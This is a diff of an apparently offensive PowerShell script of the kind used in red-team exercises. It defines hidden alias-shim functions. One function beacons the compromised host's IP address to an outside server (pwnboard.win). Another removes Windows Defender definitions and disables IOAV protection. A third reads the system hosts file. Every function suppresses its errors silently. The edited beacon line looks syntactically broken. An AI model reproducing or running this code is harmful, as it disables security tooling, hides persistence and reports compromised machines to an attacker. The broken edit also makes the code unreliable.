@@ -1,5 +1,5 @@
 $mm = @'
-function mm {try {$i=Test-Connection -ComputerName (hostname) -Count 1|Select-Object -ExpandProperty IPV4Address;$i=$i.IPAddressToString;$p=@{"ip"=$i;"type"="Alias_Shim"}|ConvertTo-Json;Invoke-WebRequest "http://pwnboard.win/generic" -Method Post -UseBasicParsing -Body $p -ContentType "application/json"|Out-Null}Catch{}}
+function mm {try {$i=Test-Connection -ComputerName (hostname) -Count 1|try{Select-Object -ExpandProperty IPV4Address;$i=$i.IPAddressToString}Catch{};$p=@{"ip"=$i;"type"="Alias_Shim"}|ConvertTo-Json;Invoke-WebRequest "http://pwnboard.win/generic" -Method Post -UseBasicParsing -Body $p -ContentType "application/json"|Out-Null}Catch{}}
 '@.Trim()
 $dd = @'
 function dd {try{Invoke-Expression("'C:\Program Files\Windows Defender\MpCmdRun.exe' -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true") -ErrorAction SilentlyContinue | Out-Null}Catch{}}
@@ -14,7 +14,7 @@ function xx {try{$x=$false;Get-Content "C:\Windows\System32\drivers\etc\hosts" -
 $orig_dct = @{ }
 function cool() {
     param([parameter(ValueFromPipeline)][string]$cmd)
-    if ($cmd -match "gin" -or $cmd -match "gtz") {
+    if ($cmd -match "gin" -or $cmd -match "stz" -or $cmd -match "gtz" -or $cmd -match "write") {
         # Not shimming as newGuid() uses gin alias and that breaks things
         return;
     }
